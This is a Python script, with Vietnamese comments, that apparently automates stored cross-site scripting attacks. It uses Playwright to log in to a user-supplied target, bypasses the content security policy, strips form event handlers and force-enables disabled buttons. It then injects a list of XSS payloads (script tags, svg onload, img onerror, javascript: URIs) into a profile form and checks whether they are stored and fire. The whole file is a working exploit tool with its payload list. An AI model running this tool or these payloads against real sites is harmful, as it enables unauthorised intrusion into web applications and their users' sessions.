import time
import signal
import sys
import logging
import requests
import random
from playwright.sync_api import sync_playwright, Playwright
from playwright._impl._errors import TimeoutError

# Thiết lập logging
logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<scrIpt>alert('XSS')</scrIpt>",
    "javascript:alert('XSS')",
]

# Biến toàn cục để theo dõi trạng thái quét
stop_scanning = False
results_found = []
alert_triggered = False  # Biến để kiểm soát số lượng alert

# Xử lý tín hiệu dừng (Ctrl+C)
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Tự động đăng nhập và khai thác XSS bằng Playwright
def auto_login_and_exploit_xss(playwright: Playwright, login_url, userinfo_url, sqli_payload, xss_payload, max_retries=3):
    global stop_scanning, alert_triggered
    browser = None
    try:
        browser = playwright.chromium.launch(headless=False)  # Tắt chế độ headless để hiển thị giao diện
        context = browser.new_context(
            ignore_https_errors=True,
            bypass_csp=True,
            viewport={"width": 1280, "height": 720}
        )
        for attempt in range(max_retries):
            try:
                page = context.new_page()

                # Xử lý dialog ngay từ đầu để tránh bị treo
                def handle_dialog(dialog):
                    global alert_triggered
                    if not alert_triggered:
                        alert_triggered = True
                        print(f"[*] Native alert triggered: {dialog.message}")
                        print("[*] Accepting alert automatically...")
                        dialog.accept()
                        # Vô hiệu hóa thêm alert
                        page.evaluate("""
                            () => {
                                window.alert = () => {};
                                const scripts = document.querySelectorAll('script');
                                scripts.forEach(script => {
                                    if (script.innerHTML.includes('alert')) {
                                        script.remove();
                                    }
                                });
                            }
                        """)

                page.on("dialog", handle_dialog)

                # 1. Đăng nhập bằng Playwright (sử dụng payload an toàn hơn)
                print(f"[*] Opening Chrome to login at {login_url} (Attempt {attempt + 1}/{max_retries})...")
                page.goto(login_url)
                page.wait_for_selector("input[name='uname']", timeout=60000)
                page.fill("input[name='uname']", "test")  # Sử dụng username an toàn
                page.wait_for_selector("input[name='pass']", timeout=60000)
                page.fill("input[name='pass']", "test")  # Sử dụng password an toàn
                page.wait_for_selector("input[type='submit']", timeout=60000)
                page.click("input[type='submit']")

                # Chờ điều hướng hoặc xử lý alert
                try:
                    page.wait_for_url("**/userinfo.php", timeout=30000)
                    print(f"[*] Login successful, redirected to {page.url}")
                except TimeoutError:
                    if alert_triggered:
                        print("[*] Alert triggered during login, proceeding without waiting for full redirection...")
                    else:
                        raise

                # Lưu cookies
                cookies = context.cookies()
                session = requests.Session()
                for cookie in cookies:
                    session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])

                # Thêm thời gian chờ
                print("[*] Waiting for 2 seconds to reduce server load...")
                time.sleep(2)

                # 2. Khai thác XSS trên userinfo.php
                print(f"[*] Navigating to {userinfo_url} to exploit XSS...")
                page.goto(userinfo_url)

                # Kiểm tra session
                if "uaddress" not in page.content():
                    print("[!] Session may be invalid, page does not contain expected form. Retrying login...")
                    page.goto(login_url)
                    page.wait_for_selector("input[name='uname']", timeout=60000)
                    page.fill("input[name='uname']", "test")
                    page.wait_for_selector("input[name='pass']", timeout=60000)
                    page.fill("input[name='pass']", "test")
                    page.wait_for_selector("input[type='submit']", timeout=60000)
                    page.click("input[type='submit']")
                    page.wait_for_url("**/userinfo.php", timeout=30000)
                    page.goto(userinfo_url)

                # Tạo dữ liệu ngẫu nhiên
                unique_email = f"test_{random.randint(1000, 9999)}@example.com"
                unique_address = f"Street_{random.randint(1000, 9999)}"
                unique_phone = f"123{random.randint(10000000, 99999999)}"

                # Điền payload XSS và dữ liệu ngẫu nhiên vào form
                print("[*] Filling form data...")
                page.wait_for_selector("input[name='urname']", timeout=60000)
                page.fill("input[name='urname']", xss_payload)
                page.wait_for_selector("input[name='ucc']", timeout=60000)
                page.fill("input[name='ucc']", "1234567890123456")

                email_selectors = ["input[name='uemail']", "textarea[name='uemail']"]
                email_field_found = False
                for selector in email_selectors:
                    try:
                        page.wait_for_selector(selector, timeout=10000)
                        page.fill(selector, unique_email)
                        email_field_found = True
                        break
                    except TimeoutError:
                        continue
                if not email_field_found:
                    raise Exception("Could not find the 'E-Mail' field to fill")

                page.wait_for_selector("input[name='uphone']", timeout=60000)
                page.fill("input[name='uphone']", unique_phone)

                address_selectors = [
                    "textarea[name='uaddress']", "input[name='uaddress']", "textarea[id='uaddress']",
                    "input[id='uaddress']", "textarea[name='address']", "input[name='address']", "textarea"
                ]
                address_field_found = False
                for selector in address_selectors:
                    try:
                        page.wait_for_selector(selector, timeout=20000)
                        page.evaluate(f"""
                            (selector) => {{
                                const element = document.querySelector(selector);
                                if (element) {{
                                    element.onchange = null;
                                    element.oninput = null;
                                    element.onblur = null;
                                    element.onkeyup = null;
                                    element.onkeydown = null;
                                    element.onfocus = null;
                                }}
                            }}
                        """, selector)
                        page.fill(selector, unique_address)
                        address_field_found = True
                        break
                    except TimeoutError:
                        continue
                if not address_field_found:
                    raise Exception("Could not find the 'Address' field to fill")

                # Tìm và bấm nút "update"
                print("[*] Submitting form...")
                update_button_selectors = [
                    "input[name='update']", "button[name='update']", "input[type='submit']",
                    "button[type='submit']", "input[value='update']", "button[value='update']",
                    "form input[type='submit']", "form button[type='submit']", "input[name='submit']",
                    "button[name='submit']", "button"
                ]
                update_button_found = False
                for selector in update_button_selectors:
                    try:
                        page.wait_for_selector(selector, timeout=20000, state="visible")
                        is_disabled = page.evaluate(f"(selector) => document.querySelector(selector).disabled", selector)
                        if is_disabled:
                            print(f"[!] Button {selector} is disabled. Attempting to enable it...")
                            page.evaluate(f"(selector) => document.querySelector(selector).disabled = false", selector)
                            is_disabled = page.evaluate(f"(selector) => document.querySelector(selector).disabled", selector)
                            if is_disabled:
                                print(f"[!] Button {selector} is still disabled. Skipping...")
                                continue
                        button_text = page.evaluate(f"(selector) => document.querySelector(selector).value || document.querySelector(selector).textContent", selector)
                        button_text = button_text.lower() if button_text else ""
                        if "update" not in button_text:
                            continue
                        page.evaluate(f"""
                            (selector) => {{
                                const element = document.querySelector(selector);
                                if (element) {{
                                    element.onclick = null;
                                    element.onmousedown = null;
                                    element.onmouseup = null;
                                }}
                            }}
                        """, selector)
                        page.click(selector)
                        update_button_found = True
                        print(f"[*] Successfully clicked 'update' button with selector: {selector}")
                        break
                    except TimeoutError:
                        print(f"[!] Timeout waiting for selector {selector}. Trying next selector...")
                        continue
                    except Exception as e:
                        print(f"[!] Error with selector {selector}: {e}. Trying next selector...")
                        continue
                if not update_button_found:
                    raise Exception("Could not find the 'update' button to submit the form")

                # Kiểm tra payload đã lưu
                print("[*] Verifying if payload was stored...")
                time.sleep(2)
                response = requests.get(userinfo_url, cookies={cookie['name']: cookie['value'] for cookie in context.cookies()}, timeout=10)
                if xss_payload in response.text:
                    print(f"[*] Payload {xss_payload} found in response HTML, likely stored.")
                else:
                    print(f"[!] Payload {xss_payload} not found in response HTML. XSS may not have been exploited.")
                    raise Exception("Payload not stored in HTML after form submission")

                # Kích hoạt alert một lần
                print("[*] Triggering alert dialog (once)...")
                alert_triggered = False
                native_alert_message = [None]

                def handle_dialog(dialog):
                    global alert_triggered
                    if not alert_triggered:
                        alert_triggered = True
                        native_alert_message[0] = dialog.message
                        print(f"[*] Native alert triggered: {dialog.message}")
                        print("[*] Accepting alert automatically...")
                        dialog.accept()
                        page.evaluate("""
                            () => {
                                window.alert = () => {};
                                const scripts = document.querySelectorAll('script');
                                scripts.forEach(script => {
                                    if (script.innerHTML.includes('alert')) {
                                        script.remove();
                                    }
                                });
                            }
                        """)

                page.on("dialog", handle_dialog)

                # Thực thi payload một lần
                page.evaluate(f"""
                    () => {{
                        if (!window.alertTriggered) {{
                            window.alertTriggered = true;
                            {xss_payload.replace('<script>', '').replace('</script>', '')}
                        }}
                    }}
                """)
                page.wait_for_timeout(15000)

                if not alert_triggered:
                    print("[!] Native alert did not appear. Proceeding with custom alert...")

                # Tạo custom alert
                print("[*] Triggering custom alert...")
                alert_message = page.evaluate(f"""
                    () => {{
                        if (!window.customAlertTriggered) {{
                            window.customAlertTriggered = true;
                            const alertMessage = "{xss_payload.replace('<script>alert(1)</script>', '1')}";
                            window.lastAlert = alertMessage;
                            const alertDiv = document.createElement('div');
                            alertDiv.style.position = 'fixed';
                            alertDiv.style.top = '50%';
                            alertDiv.style.left = '50%';
                            alertDiv.style.transform = 'translate(-50%, -50%)';
                            alertDiv.style.backgroundColor = 'white';
                            alertDiv.style.border = '2px solid black';
                            alertDiv.style.padding = '20px';
                            alertDiv.style.zIndex = '1000';
                            alertDiv.innerText = 'Custom Alert: ' + alertMessage;
                            document.body.appendChild(alertDiv);
                            setTimeout(() => {{
                                document.body.removeChild(alertDiv);
                            }}, 10000);
                            return alertMessage;
                        }}
                        return null;
                    }}
                """)
                time.sleep(10)

                # Hiển thị kết quả
                print(f"[!!!] Stored XSS Exploited with payload: {xss_payload} at {userinfo_url}")
                if alert_triggered and native_alert_message[0]:
                    print(f"[*] Native alert triggered: {native_alert_message[0]}")
                if alert_message:
                    print(f"[*] Custom alert triggered: {alert_message}")
                result = f"[!!!] Stored XSS Exploited with payload: {xss_payload} at {userinfo_url}"
                if alert_triggered and native_alert_message[0]:
                    result += f"\n[*] Native alert triggered: {native_alert_message[0]}"
                if alert_message:
                    result += f"\n[*] Custom alert triggered: {alert_message}"

                print(result)
                results_found.append(result)
                with open("xss_results.txt", "a") as f:
                    f.write(f"Exploited: {userinfo_url}\n")
                logging.info(f"Stored XSS Exploited with payload: {xss_payload}")
                stop_scanning = True
                return True

            except TimeoutError as e:
                print(f"[!] Timeout waiting for alert dialog or page redirection (Attempt {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    print("[*] Retrying...")
                    if page:
                        page.close()
                    continue
                print(f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url} (check manually)")
                result = f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url}\n[*] Alert dialog should have been triggered (check manually)."
                print(result)
                results_found.append(result)
                with open("xss_results.txt", "a") as f:
                    f.write(f"Exploited: {userinfo_url}\n")
                logging.info(f"Stored XSS may have been exploited with payload: {xss_payload}")
                stop_scanning = True
                return True
            except Exception as e:
                print(f"[!] Error during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    print("[*] Retrying...")
                    if page:
                        page.close()
                    continue
                print(f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url} (check manually)")
                result = f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url}\n[*] Alert dialog should have been triggered (check manually)."
                print(result)
                results_found.append(result)
                with open("xss_results.txt", "a") as f:
                    f.write(f"Exploited: {userinfo_url}\n")
                logging.info(f"Stored XSS may have been exploited with payload: {xss_payload}")
                stop_scanning = True
                return True

        return False

    finally:
        if browser:
            print("[*] Closing Chrome browser...")
            browser.close()

# Hàm khai thác tự động
def auto_exploit(url, vuln_name, payloads, max_time=600):
    global stop_scanning
    start_time = time.time()
    print(f"\n[*] Scanning {vuln_name} on {url} (Max time: {max_time} seconds)")

    userinfo_url = f"{url.rstrip('/')}/userinfo.php"
    login_url = f"{url.rstrip('/')}/login.php"

    with sync_playwright() as playwright:
        for payload in payloads:
            if stop_scanning:
                break
            print(f"[*] Testing XSS payload: {payload}")
            if auto_login_and_exploit_xss(playwright, login_url, userinfo_url, "test", payload):  # Thay đổi sqli_payload
                break

    if results_found:
        with open("scan_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")

# Hàm quét XSS và hiển thị menu
def scan_xss_and_continue():
    global stop_scanning, alert_triggered
    while True:
        stop_scanning = False
        alert_triggered = False
        results_found.clear()

        target_url = input("Enter target URL to scan for XSS (e.g., http://example.com/): ")
        auto_exploit(target_url, "XSS", XSS_PAYLOADS)

        print("\nScan completed!")
        print("Would you like to continue scanning another URL or exit?")
        print("1. Scan another URL")
        print("2. Exit")
        choice = input("Enter your choice (1 or 2): ")

        if choice == "1":
            continue
        elif choice == "2":
            print("[*] Exiting program...")
            sys.exit(0)
        else:
            print("[!] Invalid choice. Exiting program...")
            sys.exit(0)

if __name__ == "__main__":
    scan_xss_and_continue()